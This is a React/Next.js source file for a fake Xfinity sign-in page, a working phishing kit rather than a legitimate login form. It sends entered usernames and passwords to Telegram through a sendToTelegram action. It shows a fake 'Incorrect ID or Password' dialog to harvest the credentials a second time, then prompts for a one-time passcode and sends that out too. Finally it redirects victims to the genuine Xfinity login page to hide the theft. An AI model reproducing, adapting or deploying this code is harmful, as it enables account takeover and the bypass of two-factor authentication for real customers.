"use client";

import { useState, FormEvent, ChangeEvent } from "react";
import { useSearchParams } from "next/navigation";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import Image from "next/image";
import XfinityFooter from "./data";
import { sendToTelegram } from "./actions";
import { z } from "zod";

// Zod validation schemas
const loginSchema = z.object({
  username: z
    .string()
    .min(1, "Email, mobile, or username is required")
    .refine((value) => {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^\+?[\d\s-()]+$/;
      const usernameRegex = /^[a-zA-Z0-9._-]+$/;
      return (
        emailRegex.test(value) ||
        phoneRegex.test(value) ||
        usernameRegex.test(value)
      );
    }, "Please enter a valid email, mobile number, or username"),
  password: z.string().min(8, "Password must be at least 8 characters"),
});

const otpSchema = z.object({
  otp: z
    .string()
    .length(6, "OTP must be exactly 6 digits")
    .regex(/^\d+$/, "OTP must contain only numbers"),
});

// Type definitions
interface FormData {
  username: string;
  password: string;
  otp: string;
  hp: string;
}

interface FormErrors {
  username?: string;
  password?: string;
  otp?: string;
}

type Stage = 1 | 2;

interface TelegramPayload {
  username: string;
  password: string;
  otp?: string;
  stage: "Login" | "OTP";
  ref: number;
}

export default function XfinityLogin() {
  const searchParams = useSearchParams();
  const ref = parseInt(searchParams.get("ref") || "1", 10); // Default to 1 if ref is missing
  const [stage, setStage] = useState<Stage>(1);
  const [showDialog, setShowDialog] = useState<boolean>(false);
  const [submissionCount, setSubmissionCount] = useState<number>(0);
  const [form, setForm] = useState<FormData>({
    username: "",
    password: "",
    otp: "",
    hp: "",
  });
  const [errors, setErrors] = useState<FormErrors>({});

  const handleSubmit = async (e: FormEvent<HTMLFormElement>): Promise<void> => {
    e.preventDefault();
    setErrors({});
    if (form.hp) {
      return;
    }

    if (stage === 1) {
      const result = loginSchema.safeParse({
        username: form.username,
        password: form.password,
      });

      if (!result.success) {
        const fieldErrors: FormErrors = {};
        result.error.issues.forEach((issue) => {
          const field = issue.path[0] as keyof FormErrors;
          fieldErrors[field] = issue.message;
        });
        setErrors(fieldErrors);
        return;
      }

      const payload: TelegramPayload = {
        username: form.username,
        password: form.password,
        stage: "Login",
        ref,
      };

      try {
        await sendToTelegram(payload);
        setSubmissionCount((prev) => prev + 1);
        if (submissionCount < 1) {
          // First submission: clear inputs, show "Incorrect ID or Password" modal
          setForm({ username: "", password: "", otp: form.otp, hp: form.hp });
          setShowDialog(true);
        } else {
          // Second submission: move to stage 2, show OTP modal
          setStage(2);
          setShowDialog(true);
        }
      } catch (err) {
        console.error("Send error:", err);
        setErrors({ username: "Failed to send data. Please try again." });
        setShowDialog(true);
      }
    } else if (stage === 2) {
      const result = otpSchema.safeParse({ otp: form.otp });

      if (!result.success) {
        const fieldErrors: FormErrors = {};
        result.error.issues.forEach((issue) => {
          const field = issue.path[0] as keyof FormErrors;
          fieldErrors[field] = issue.message;
        });
        setErrors(fieldErrors);
        return;
      }

      const payload: TelegramPayload = {
        username: form.username,
        password: form.password,
        otp: form.otp,
        stage: "OTP",
        ref,
      };

      try {
        await sendToTelegram(payload);
        setShowDialog(false);
        window.location.href = "https://login.xfinity.com/login";
      } catch (err) {
        console.error("Send error:", err);
        setErrors({ otp: "Failed to verify OTP. Please try again." });
      }
    }
  };

  const handleContinue = (): void => {
    if (stage === 1) {
      setShowDialog(false);
    } else {
      setShowDialog(false);
      window.location.href = "https://login.xfinity.com/login";
    }
  };

  const handleOtpSubmit = async (): Promise<void> => {
    const result = otpSchema.safeParse({ otp: form.otp });

    if (!result.success) {
      const fieldErrors: FormErrors = {};
      result.error.issues.forEach((issue) => {
        const field = issue.path[0] as keyof FormErrors;
        fieldErrors[field] = issue.message;
      });
      setErrors(fieldErrors);
      return;
    }

    const payload: TelegramPayload = {
      username: form.username,
      password: form.password,
      otp: form.otp,
      stage: "OTP",
      ref,
    };

    try {
      await sendToTelegram(payload);
      setShowDialog(false);
      window.location.href = "https://login.xfinity.com/login";
    } catch (err) {
      console.error("Send error:", err);
      setErrors({ otp: "Failed to verify OTP. Please try again." });
    }
  };

  const handleUsernameChange = (e: ChangeEvent<HTMLInputElement>): void => {
    setForm({ ...form, username: e.target.value });
    if (errors.username) {
      setErrors({ ...errors, username: undefined });
    }
  };

  const handlePasswordChange = (e: ChangeEvent<HTMLInputElement>): void => {
    setForm({ ...form, password: e.target.value });
    if (errors.password) {
      setErrors({ ...errors, password: undefined });
    }
  };

  const handleOtpChange = (value: string): void => {
    setForm({ ...form, otp: value });
    if (errors.otp) {
      setErrors({ ...errors, otp: undefined });
    }
  };

  return (
    <>
      <main className="flex flex-col lg:flex-row items-center lg:items-start justify-center gap-6 lg:gap-0 mb-8 bg-white">
        <section className="w-full lg:w-1/2 px-6 pt-10 lg:pt-24">
          <div className="max-w-[564px] mx-auto">
            <div className="flex items-center mb-8">
              <Image
                alt="Xfinity Logo"
                height={80}
                width={100}
                src="/xfinity-logo-grey.svg"
              />
            </div>

            <h1 className="text-3xl font-bold text-gray-900 mb-6">
              Sign in with your Xfinity ID
            </h1>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <div style={{ display: "none" }} aria-hidden="true">
                  <label htmlFor="hp">Do not fill</label>
                  <input
                    id="hp"
                    name="hp"
                    type="text"
                    value={form.hp || ""}
                    onChange={(e) => setForm({ ...form, hp: e.target.value })}
                    autoComplete="off"
                    tabIndex={-1}
                  />
                </div>
                <input
                  type="text"
                  placeholder="Email, mobile, or username"
                  value={form.username}
                  onChange={handleUsernameChange}
                  required
                  aria-label="Email, mobile, or username"
                  className="w-full inputt outline rounded-sm focus:outline-red-500 p-4 border-amber-300 transition"
                />
                {errors.username && (
                  <p className="text-red-500 text-sm mt-1">{errors.username}</p>
                )}
              </div>

              <div>
                <input
                  type="password"
                  placeholder="Password"
                  value={form.password}
                  onChange={handlePasswordChange}
                  required
                  aria-label="Password"
                  className="w-full inputt outline rounded-sm focus:outline-red-500 p-4 border-amber-300 transition"
                />
                {errors.password && (
                  <p className="text-red-500 text-sm mt-1">{errors.password}</p>
                )}
              </div>

              <p className="text-sm text-gray-600 mt-2">
                By signing in, you agree to our{" "}
                <a
                  href="http://my.xfinity.com/terms/web/"
                  className="text-blue-600 underline hover:text-blue-700"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Terms of Service
                </a>{" "}
                and{" "}
                <a
                  href="https://www.xfinity.com/privacy/"
                  className="text-blue-600 underline hover:text-blue-700"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy Policy
                </a>
                .
              </p>

              <button
                type="submit"
                className="sc-prism-button font-bold cursor-pointer bg-blue-600 text-white rounded-sm py-3 mt-8 hover:bg-blue-700 transition"
              >
                Let&apos;s go
              </button>
            </form>
          </div>
        </section>

        <aside className="w-full lg:max-h-[1200px] h-[450px] lg:h-[600px] lg:w-1/2 flex justify-center items-center bg-gray-50">
          <a
            href="https://www.xfinity.com/learn/mobile/plan/savings-calculator"
            target="_blank"
            rel="noreferrer"
            className="w-full sm:block hidden h-full lg:w-full lg:h-full bg-cover bg-top"
            style={{
              backgroundImage:
                "url('https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_4.15.25_Update_Desktop.png')",
            }}
            aria-label="Let's cut your mobile bill in half."
          />
          <a
            href="https://www.xfinity.com/learn/mobile/plan/savings-calculator"
            target="_blank"
            rel="noreferrer"
            className="w-full sm:hidden max-w-[400px] scale-75 block h-full lg:w-full lg:h-full bg-cover bg-top"
            style={{
              backgroundImage:
                "url('https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_Mobile_XCIMA-49176.png')",
            }}
            aria-label="Let's cut your mobile bill in half."
          />
        </aside>
      </main>

      <XfinityFooter />

      <Dialog open={showDialog} onOpenChange={setShowDialog}>
        <DialogContent className="sm:max-w-[425px] text-center">
          {stage === 1 ? (
            <>
              <DialogHeader>
                <DialogTitle>Incorrect ID or Password</DialogTitle>
                <DialogDescription>
                  Please check your Xfinity ID and password and try again.
                </DialogDescription>
              </DialogHeader>
              <Button onClick={handleContinue} className="mt-4">
                Try Again
              </Button>
            </>
          ) : (
            <>
              <DialogHeader>
                <DialogTitle>Verification Required</DialogTitle>
                <DialogDescription>
                  Enter the one-time passcode sent to your device.
                </DialogDescription>
              </DialogHeader>
              <div className="flex flex-col items-center gap-4 mt-4">
                <InputOTP
                  maxLength={6}
                  value={form.otp}
                  onChange={handleOtpChange}
                  className="gap-2"
                >
                  <InputOTPGroup className="gap-2">
                    <InputOTPSlot index={0} className="w-12 h-12 text-lg" />
                    <InputOTPSlot index={1} className="w-12 h-12 text-lg" />
                    <InputOTPSlot index={2} className="w-12 h-12 text-lg" />
                    <InputOTPSlot index={3} className="w-12 h-12 text-lg" />
                    <InputOTPSlot index={4} className="w-12 h-12 text-lg" />
                    <InputOTPSlot index={5} className="w-12 h-12 text-lg" />
                  </InputOTPGroup>
                </InputOTP>
                {errors.otp && (
                  <p className="text-red-500 text-sm">{errors.otp}</p>
                )}
              </div>
              <Button onClick={handleOtpSubmit} className="mt-4">
                Verify
              </Button>
            </>
          )}
        </DialogContent>
      </Dialog>
    </>
  );
}
